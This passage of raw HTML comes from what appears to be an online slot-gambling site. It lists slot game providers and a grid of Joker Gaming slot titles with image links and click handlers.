                                      <a class="btn-box " href="/slots/booming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/ttg_slot8510.png" data-src="/assets/game_logos/100x70/ttg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BOOMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/fachai" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/fachai_slot8510.png" data-src="/assets/game_logos/100x70/fachai_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FACHAI</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/jdb" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/jdb_slot8510.png" data-src="/assets/game_logos/100x70/jdb_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JDB</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/dragoonsoft" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/dragoon_slot8510.png" data-src="/assets/game_logos/100x70/dragoon_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">DRAGOON SOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/apollo777" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/apollo777_slot8510.png" data-src="/assets/game_logos/100x70/apollo777_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">APOLLO777</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/5gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/5gaming_slot8510.png" data-src="/assets/game_logos/100x70/5gaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">5GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/ygg" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/yggslot8510.png" data-src="/assets/game_logos/100x70/yggslot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">YGG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/kagaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/kagaming_slot8510.png" data-src="/assets/game_logos/100x70/kagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">KA GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/nagagames" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/nagagames_slot8510.png" data-src="/assets/game_logos/100x70/nagagames_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NAGA GAMES</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/live22" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/live22_slot8510.png" data-src="/assets/game_logos/100x70/live22_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">LIVE22</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/onegame" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/onegame_slot8510.png" data-src="/assets/game_logos/100x70/onegame_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">One Game</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/bgaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/bgaming_slot8510.png" data-src="/assets/game_logos/100x70/bgaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BGAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/gmw" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/gmw_slot8510.png" data-src="/assets/game_logos/100x70/gmw_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">GMW</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/uu" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/uu_slot8510.png" data-src="/assets/game_logos/100x70/uu_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">UU Slot</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/i8" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/i8_slot8510.png" data-src="/assets/game_logos/100x70/i8_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">i8</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/pegasus" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/pegasus_slot8510.png" data-src="/assets/game_logos/100x70/pegasus_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PEGASUS</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/btg" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/btg_slot8510.png" data-src="/assets/game_logos/100x70/btg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BTG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/kingmidas" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/kingmaker_slot8510.png" data-src="/assets/game_logos/100x70/kingmaker_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">KINGMIDAS</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/smartsoft" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/smartsoft_slot8510.png" data-src="/assets/game_logos/100x70/smartsoft_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SMARTSOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/toptrend-gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/ttg_slot8510.png" data-src="/assets/game_logos/100x70/ttg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">TOPTREND GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/liteplay" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/liteplay_slot8510.png" data-src="/assets/game_logos/100x70/liteplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">LITEPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                        <div class="btn-box  maintenance-alert bg-um " style="position:relative;overflow: hidden;">
                                                                 <img alt="" src="/assets/game_logos/100x70/mancalagaming_slot8510.png" data-src="/assets/game_logos/100x70/mancalagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title"> MANCALA GAMING</h5>
                </div>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                        <div class="btn-box  maintenance-alert bg-um " style="position:relative;overflow: hidden;">
                                                                 <img alt="" src="/assets/game_logos/100x70/eagaming_slot8510.png" data-src="/assets/game_logos/100x70/eagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title"> EA GAMING</h5>
                </div>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/evoplay" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/evoplay_slot8510.png" data-src="/assets/game_logos/100x70/evoplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">EVOPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/sbo" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/sbo_slot8510.png" data-src="/assets/game_logos/100x70/sbo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SBO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/568win" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/sbo_568win_slot8510.png" data-src="/assets/game_logos/100x70/sbo_568win_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">568 WIN</h5>
              </a>
                           </div>
          
      </div>
    </div>
    <div class="right"><button class="next-btn btn" id="right-button"><i class="icon-keyboard_arrow_right"></i></button></div>


  </div>
</div>


         <div class="row no-gutters filter">
    <div class="col-xs-10 text-center">
      <div class="row">
        <div class="col-xs-3">
          <button class="btn btn-clear f" data-filter="NEW" [ngclass]="{ 'active': filterProperty==FilterType.New  }">BARU</button>
        </div>
        <div class="col-xs-3">
          <button class="btn btn-clear f" data-filter="TOP" [ngclass]="{ 'active': filterProperty==FilterType.Top  }">TOP</button>
        </div>
        <div class="col-xs-3">
          <button class="btn btn-clear f active" data-filter="ALL" [ngclass]="{ 'active': filterProperty==FilterType.All  }">SEMUA </button>
        </div>
      </div>
    </div>
    <div class="col-xs-1 text-right">
      <button class="btn btn-clear" id="btnFilters_003" data-filter="" data-trigger="nifty" data-target="#searchModal"><i class="icon-magnifier"></i></button>
    </div>
    <div class="col-xs-1 text-right">
      <button class="btn btn-clear" id="btnFilters_003" data-filter="" data-trigger="nifty" data-target="#filterModal-2"><i class="icon-equalizer2"></i></button>
    </div>
  </div>
  <div class="mobile-border"></div>
  <div class="mobile-border"></div>
  <br>
  <input type="hidden" value="jk_slot" name="hiddenGameID-001" id="hiddenGameID-001">
  <div class="row games no-gutters">
          

                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Winning Horse Lunar Carnival" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Winning Horse Lunar Carnival', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/046207dd1f2b3e95a1e64ded2e217e1d.webp?v=0.1' , 'zid3zqi5znh5h', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/046207dd1f2b3e95a1e64ded2e217e1d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Winning Horse Lunar Carnival">Winning Horse Lunar Carnival</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Book Of Thermopylae" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Book Of Thermopylae', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/2382b00ee9e9da9f968864acbcaaa4ae.webp?v=0.1' , 'ipkauigi3mfho', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/2382b00ee9e9da9f968864acbcaaa4ae.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Book Of Thermopylae">Book Of Thermopylae</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gods Of Asgard" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gods Of Asgard', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/92537447d7cb9447ae1d9caabcda7605.webp?v=0.1' , 'b55de45epfzg6', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/92537447d7cb9447ae1d9caabcda7605.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gods Of Asgard">Gods Of Asgard</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Christmas Fortune" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Christmas Fortune', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/69052f38e06582c0b6163eb8885db890.webp?v=0.1' , '6ogpfdcnoqyen', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/69052f38e06582c0b6163eb8885db890.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Christmas Fortune">Christmas Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jiang Shi Night" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jiang Shi Night', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/f1d262bf8ac7f8b7fa7a1ab2a453ade8.webp?v=0.1' , 'of74x9z99u69r', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/f1d262bf8ac7f8b7fa7a1ab2a453ade8.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jiang Shi Night">Jiang Shi Night</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super Fortune Crown" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super Fortune Crown', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/2ce0ffa9c50a70d67604b8e3f1a4750e.webp?v=0.1' , 'r8poqz19mtqir', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/2ce0ffa9c50a70d67604b8e3f1a4750e.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super Fortune Crown">Super Fortune Crown</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Moon Goddess" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Moon Goddess', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/28deb3a43a3198691c1abd3ec81885a2.webp?v=0.1' , 'y59nah5oqf58q', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/28deb3a43a3198691c1abd3ec81885a2.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Moon Goddess">Moon Goddess</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Maya Ways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Maya Ways', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/258a0f7e93f2f973c149ef0d314b9e6a.webp?v=0.1' , 'd5uyes4amfxf6', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/258a0f7e93f2f973c149ef0d314b9e6a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Maya Ways">Maya Ways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super Seven Seas" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super Seven Seas', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/d53adbd2c3afddf28a984de0f5890991.webp?v=0.1' , 'x4dkj69a989x6', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/d53adbd2c3afddf28a984de0f5890991.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super Seven Seas">Super Seven Seas</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Ball" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Ball', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/3873bea789de4289c73ce27f9a3da025.webp?v=0.1' , 'bnqnhhmsq748k', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/3873bea789de4289c73ce27f9a3da025.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Ball">Dragon Ball</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mahjong King" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mahjong King', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/5702b0218ce2921323a02be615ea1c45.webp?v=0.1' , '3r369pizs144w', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/5702b0218ce2921323a02be615ea1c45.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mahjong King">Mahjong King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Steamboat Ride Hold And Win" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Steamboat Ride Hold And Win', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/66e0732cd6b8e79ce8e261967cdabd0c.webp?v=0.1' , 'gxgtnunpejbwy', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/66e0732cd6b8e79ce8e261967cdabd0c.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Steamboat Ride Hold And Win">Steamboat Ride Hold And Win</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Seven Seas" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Seven Seas', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/98920a4662eb22b5bd22ebc6b82b11e6.webp?v=0.1' , 'mno8hejgrh1nk', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/98920a4662eb22b5bd22ebc6b82b11e6.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Seven Seas">Seven Seas</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Crown 25" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Crown 25', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/43f2baef8afbc993a2f435f370f7954b.webp?v=0.1' , 'm4uregaadrxb6', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/43f2baef8afbc993a2f435f370f7954b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Crown 25">Fortune Crown 25</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Savage Frontier" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Savage Frontier', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/f621136d2cc625610086acb1ed54532d.webp?v=0.1' , 'es9sgctugyauc', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/f621136d2cc625610086acb1ed54532d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Savage Frontier">Savage Frontier</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Inca" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Inca', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/5569f84c224ffef28be8c2ec88208177.webp?v=0.1' , 'bu4nw7mkppwg1', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/5569f84c224ffef28be8c2ec88208177.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Inca">Inca</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ramesses Relics" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ramesses Relics', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/7fbcdc22629eb135d5c25d33660d9986.webp?v=0.1' , 'gmfbyu4cjibrg', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/7fbcdc22629eb135d5c25d33660d9986.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ramesses Relics">Ramesses Relics</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Roma Deluxe" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Roma Deluxe', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/d767bdbecc21cedbd5c1163ea087e27b.webp?v=0.1' , 'm6cwkgy3daxta', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/d767bdbecc21cedbd5c1163ea087e27b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Roma Deluxe">Roma Deluxe</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Crown" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Crown', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/fc58e34989cab23780d9c05d602eb27a.webp?v=0.1' , 'ym7ny95hxi38g', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/fc58e34989cab23780d9c05d602eb27a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Crown">Fortune Crown</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Temple" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Temple', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/960de22bd8391d7b13a9b374cc1d50e1.webp?v=0.1' , 'si838osdadyhc', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/960de22bd8391d7b13a9b374cc1d50e1.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Temple">Fire Temple</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Legend Of Persia" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Legend Of Persia', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/7ba3a00d724641d7a56c0656b43c3b77.webp?v=0.1' , '1iz58azdhdo6c', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/7ba3a00d724641d7a56c0656b43c3b77.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Legend Of Persia">Legend Of Persia</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="World Of Emoji" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'World Of Emoji', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/ab1b0883d3ea831c5eba2524593960e0.webp?v=0.1' , 'sbrjp1qq39gc4', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/ab1b0883d3ea831c5eba2524593960e0.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="World Of Emoji">World Of Emoji</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Carnaval Do Rio" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Carnaval Do Rio', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/7e7043ac73ec229868943f8276b709c6.webp?v=0.1' , 'xgbi6bo8yon9w', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/7e7043ac73ec229868943f8276b709c6.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Carnaval Do Rio">Carnaval Do Rio</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Black Knight" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Black Knight', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/2b3174941581900fe2e59a8e28a9e822.webp?v=0.1' , '1bwmp4xq79sq4', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/2b3174941581900fe2e59a8e28a9e822.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Black Knight">Black Knight</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Chocolate Shop" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Chocolate Shop', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/a752e1a47999bf6ceaa46dc7ed8e8987.webp?v=0.1' , 'gz8tgo1debywc', '' )" style="">

          <div class="content-wrapper">
              
